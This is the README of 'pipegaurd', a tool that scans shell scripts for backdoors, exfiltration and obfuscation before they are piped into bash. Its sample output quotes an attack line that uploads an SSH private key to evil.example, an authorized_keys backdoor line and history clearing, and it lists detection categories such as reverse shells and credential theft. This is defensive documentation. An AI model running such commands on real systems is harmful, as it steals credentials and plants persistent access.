# pipegaurd

**Look before you pipe.**

`pipegaurd` checks a shell script *before* you run it with `curl ... | bash`. It flags backdoors, persistence, obfuscated payloads, destructive commands, and insecure downloads, then lets you run the exact copy it analyzed, and nothing else.

Zero dependencies. One file. Works on any Linux with Python 3.8+.

<!-- Record with: asciinema rec demo.cast && agg demo.cast demo.gif -->
![pipegaurd demo](demo.gif)

---

## The problem

Install instructions everywhere look like this:

```bash
curl -fsSL https://example.com/install.sh | sudo bash
```

That runs hundreds of lines of code from the internet as root, usually without anyone reading them. The server can change the script at any time, and a script can even detect that it is being piped into a shell and serve a different payload than the one you'd see in a browser.

`pipegaurd` sits in the middle: it downloads the script, tells you what it actually does, and only runs it if you say so.

## Quick start

```bash
# check a script
pipegaurd https://example.com/install.sh

# bare domains work too (always upgraded to https://, never http://)
pipegaurd get.docker.com
pipegaurd astral.sh/uv/install.sh

# the drop-in replacement for "| bash"
curl -fsSL https://example.com/install.sh | pipegaurd --run

# check a local file
pipegaurd ./install.sh

# check only a site's connection (redirects, TLS, headers), nothing is downloaded
pipegaurd -i github.com
pipegaurd -i https://example.com/some-download.iso
```

## Installation

pipegaurd is a single Python file. Yes, we see the irony: please don't pipe our installer into bash.

```bash
git clone https://github.com/UNKNOWN-LEGENDS/pipegaurd.git
cd pipegaurd
sudo install -m 755 pipegaurd /usr/local/bin/pipegaurd
pipegaurd --version
```

**Requirement:** Python 3.8 or newer. Most distros ship it; on minimal images install it first (`apt install python3`, `dnf install python3`, `apk add python3`, `pacman -S python`).

## What it detects

61 checks across these categories:

| Category | Examples |
|---|---|
| **Privilege** | `sudo`, `su`, `pkexec`/`doas`, setuid bits, sudoers edits |
| **Destructive** | `rm -rf /` or `$HOME`, `--no-preserve-root`, writes to raw disks, `mkfs`, fork bombs |
| **Persistence** | SSH `authorized_keys`, cron jobs, systemd services, shell rc files, `LD_PRELOAD`, autostart entries, new users, kernel modules |
| **Second stage** | nested `curl \| bash`, executables dropped in `/tmp` or `/dev/shm`, hidden files, raw-IP downloads |
| **Obfuscation** | `eval`, runtime base64/hex decoding, hex-escaped strings, very long lines, **hidden base64 payloads (decoded and re-scanned)** |
| **Tampering** | disabling SELinux/AppArmor or the firewall, clearing shell history, wiping logs, turning off package signature checks, killing security tools |
| **Network / exfiltration** | reverse shells, crypto miners, reading private keys and credentials, uploading files or environment variables |
| **Transport & TLS** | plain HTTP, `curl -k`, HTTPS-to-HTTP redirects, invalid or expiring certificates, outdated TLS |
| **Source** | raw IP hosts, URL shorteners, anonymous paste sites, look-alike (punycode) domains, unusual ports |
| **Disguise** | scripts hiding behind innocent names or labels (`robots.txt`, `logo.png`, `Content-Type: image/png`), servers that rename the download, double extensions (`invoice.pdf.sh`), binaries named `.sh` |

pipegaurd judges a file by its **bytes**, never by its name or the server's `Content-Type`. Those are claims an attacker controls, so they're only compared against the real content to catch disguises.

It also recognises files that aren't scripts (archives, binaries, videos, HTML pages) from their first 4 KB and stops immediately, so pointing it at a 2 GB ISO takes under a second.

## Example output

```
  CRITICAL  Uploads SSH keys or credentials to a server [EXF003 exfiltration]
      L9     curl -s -X POST -d @$HOME/.ssh/id_ed25519 https://evil.example/collect

  HIGH      Touches SSH authorized_keys (possible backdoor) [PERS001 persistence]
      L8     echo "ssh-ed25519 AAAA... attacker@evil.example" >> ~/.ssh/authorized_keys

  HIGH      Clears or disables shell history (hiding tracks) [TAMP003 tampering]
      L11    history -c

  Talks to: evil.example

  Risk score: 100/100   Verdict:  CRITICAL
  Dangerous patterns found. Do NOT run this unless you fully understand every flagged line.
```

## Options

| Option | What it does |
|---|---|
| `--run` | After the report, ask to run the exact analyzed copy. High/critical scripts require typing `yes` in full. |
| `-i`, `--inspect`, `--site` | Site check: redirects, TLS and headers only; the body is not downloaded. Plain web pages get this report automatically. |
| `--shell SHELL` | Shell used by `--run` (default `bash`). |
| `--sudo` | With `--run`, run the script through `sudo`. |
| `--json` | Machine-readable output. |
| `--keep` | Keep the downloaded copy and print its path. |
| `--no-color` | Disable colors (`NO_COLOR` is also respected). |
| `--max-size BYTES` | Refuse scripts larger than this (default 5 MB). |
| `--timeout SEC` | Network timeout (default 20). |

**Exit codes:** `0` clean/low, `1` medium, `2` high/critical, `3` error. With `--run`, the script's own exit code is returned. This makes pipegaurd usable in scripts and CI:

```bash
pipegaurd --json https://example.com/install.sh | jq -r .verdict
```

## How it works

1. **Fetch:** the script is downloaded once, with curl's User-Agent so the server responds as it would to `curl`. Every redirect hop and the TLS certificate are recorded.
2. **Sniff:** the first 4 KB are checked for file signatures. Anything that isn't a script stops here.
3. **Scan:** the script is split into logical lines (joining `\` continuations), comments are stripped, and each line is matched against the rules. Base64 blobs are decoded and scanned recursively.
4. **Score:** each rule counts once, weighted by severity, so fifty `sudo` lines don't outweigh one reverse shell.
5. **Run (optional):** the analyzed bytes are saved to a private temp file (mode `600`), their SHA-256 is shown, and *that file* is executed. No second download, so the server can't swap the script between the check and the run.

## Limitations

pipegaurd is a seatbelt, not a guarantee.

- It's **static pattern matching**. A determined attacker can build commands from variables or fetch code at runtime in ways regexes won't catch.
- It **can't see inside binaries** a script downloads, only the script itself.
- **False positives are normal.** Most legitimate installers use `sudo` or edit your shell config, so a MEDIUM verdict usually just means "read the flagged lines".
- A CLEAN result means no known risky patterns were found, not that the script is safe.

If you find a bypass or a false positive, please open an issue with a sample.

## Development

```bash
python3 -m unittest discover tests
```

Test samples in `tests/samples/` are **only ever scanned, never executed**, and point at fake hosts and fake keys.

Adding a rule is one entry in the `RULES` list plus a test case.

To try the disguise checks against a deliberately dishonest server (localhost only, nothing is executed):

```bash
python3 tests/disguise_server.py        # terminal 1
pipegaurd http://127.0.0.1:8000/        # terminal 2: lists the test URLs
```

## License

[MIT](LICENSE)